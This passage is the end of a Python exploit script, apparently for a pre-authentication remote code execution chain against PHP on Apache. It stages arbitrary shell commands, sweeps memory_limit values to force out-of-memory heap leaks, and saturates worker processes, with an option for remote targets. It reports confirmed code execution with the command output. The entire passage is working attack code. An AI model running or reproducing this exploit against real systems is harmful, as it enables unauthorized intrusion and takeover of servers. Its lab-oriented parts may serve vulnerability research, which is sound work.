            pass
    if (args.script or args.interactive) and not outdir:
        ui.crit("--script/--interactive need a local /out mount")
        ui.result(False, "NO OUTPUT CHANNEL", "use a local lab or a web-accessible output path")
        return 4
    if args.script:
        try:
            with open(args.script, encoding="utf-8") as handle:
                body = handle.read()
        except OSError as exc:
            ui.crit(f"cannot read {args.script}: {exc}")
            return 4
        stage_script(outdir, body)
        args.command = "sh</out/c"
        proof = os.path.join(outdir, "o")
        ui.info(f"script staged in {outdir}/c")
    elif args.interactive:
        return interactive_loop(args, profile, outdir, ui)
    elif outdir:
        # Local /out: stage the command so any length works and the output is
        # captured in a file the proof reader can see.
        redirect = re.search(r">\s*(/out/[A-Za-z0-9._-]+)", args.command)
        proof = (os.path.join(outdir, os.path.basename(redirect.group(1)))
                 if redirect else os.path.join(outdir, "o"))
        stage_script(outdir, args.command)
        args.command = "sh</out/c"
        ui.info(f"command staged in {outdir}/c (output -> {proof})")
    elif len(args.command.encode()) > 14:
        ui.crit(f"command is {len(args.command.encode())} bytes; the carrier allows 14")
        ui.info("use --script FILE (local lab) or --interactive")
        ui.result(False, "COMMAND TOO LONG", args.command)
        return 4

    detected = {"memory_limit": None, "post_max_size": None, "display_errors": None}
    if not args.no_probe:
        detected = probe_config(args, ui)
    if args.huge_mb:
        limits = [max(args.huge_mb - 12, 1)]
    elif args.memory_limit_mb:
        limits = [args.memory_limit_mb]
    elif args.no_auto_memory:
        limits = [8]
    elif detected["memory_limit"]:
        limits = [detected["memory_limit"]]
    else:
        limits = [8, 16, 32, 64, 128, 256, 512]

    if detected.get("post_max_size"):
        # The stage-1 body is memory_limit+12M; a smaller post_max_size makes
        # PHP reject it before parsing (no OOM, no leak, no error). Drop the
        # candidates it would block so the sweep never wastes a run on them.
        post_mb = detected["post_max_size"] // (1024 * 1024)
        feasible = [limit_mb for limit_mb in limits
                    if oom_for(limit_mb, profile) <= post_mb]
        dropped = [limit_mb for limit_mb in limits
                   if oom_for(limit_mb, profile) > post_mb]
        if dropped:
            ui.warn(f"post_max_size={post_mb}M would reject the OOM bodies for {dropped}; skipped")
        if not feasible:
            ui.crit(f"post_max_size={post_mb}M rejects every candidate OOM body")
            ui.info("the chain posts memory_limit+12M; a smaller post_max_size "
                    "blocks the request before PHP parses it")
            ui.result(False, "CONFIG BLOCKED", f"post_max_size={post_mb}M < required OOM body")
            return 2
        limits = feasible

    pins = None
    pin_total = 0
    pin_arg = args.pin_workers
    if args.no_pin_workers:
        pin_arg = "0"
    elif pin_arg is None:
        # Saturation pinning is intrusive: keep it opt-in for remote targets.
        pin_arg = "0" if args.allow_remote else "auto"
    if str(pin_arg).lower() == "auto":
        if args.allow_remote:
            try:
                pins = WorkerPins.auto_remote(args.target, args.pin_max)
            except OSError as exc:
                ui.warn(f"remote auto-pinning failed: {exc}")
            if pins:
                ui.info(f"pinned {len(pins.socks)} remote worker(s) by saturation")
            else:
                ui.warn("remote auto-pinning inconclusive (keep-alive off or proxy)")
        else:
            try:
                result = subprocess.run(
                    ["docker", "exec", args.container, "sh", "-c",
                     "ps -eo cmd | grep -c '[a]pache2'"],
                    capture_output=True, text=True, timeout=10)
                pin_total = max(int(result.stdout.strip() or "0") - 1, 0)
            except (OSError, ValueError, subprocess.SubprocessError):
                pin_total = 0
    else:
        try:
            pin_total = int(pin_arg)
        except (TypeError, ValueError):
            pin_total = 0
    if pin_total > 1 and not args.dry_run:
        try:
            pins = WorkerPins(args.target, pin_total - 1)
            ui.info(f"pinned {pin_total - 1} worker(s); one left free")
        except OSError as exc:
            ui.warn(f"could not pin workers: {exc}")

    rc = 1
    for limit in limits:
        huge = args.huge_mb if args.huge_mb else oom_for(int(limit), profile)
        # One retry per candidate: a failed run still evolves the worker heap,
        # and a garbage stage-1 leak (see implausible_leak) only ever fails
        # after every internal attempt has been wasted on it.
        for attempt in (1, 2):
            label = f"memory_limit={limit}M  ·  huge_mb={huge}"
            if attempt > 1:
                label += f"  ·  retry {attempt - 1}"
            ui.stage("EXECUTE", label)
            if proof and os.path.exists(proof):
                with contextlib.suppress(OSError):
                    os.unlink(proof)
            sink = {}
            rc = run_upstream(args, profile, proof, huge, ui, sink=sink)
            if rc == 0 or args.dry_run:
                break
            bad = implausible_leak(sink)
            if bad and attempt == 1:
                ui.warn(f"stage 1 leaked {bad}, not a mapped heap address "
                        "(layout drifted from the profile); retrying")
                continue
            break
        if rc == 0:
            break
        if not args.dry_run:
            ui.warn(f"memory_limit={limit}M did not succeed")

    if pins:
        pins.close()
    if args.dry_run:
        return 0
    if rc != 0:
        ui.result(False, "NOT CONFIRMED", "no execution proof")
        return 1

    detail = "proof retrieved by --fetch"
    if proof and os.path.isfile(proof):
        with contextlib.suppress(OSError), \
                open(proof, encoding="utf-8", errors="replace") as handle:
            detail = handle.read().strip()
    ui.result(True, "PRE-AUTH RCE CONFIRMED", detail)
    return 0


if __name__ == "__main__":
    sys.exit(main())
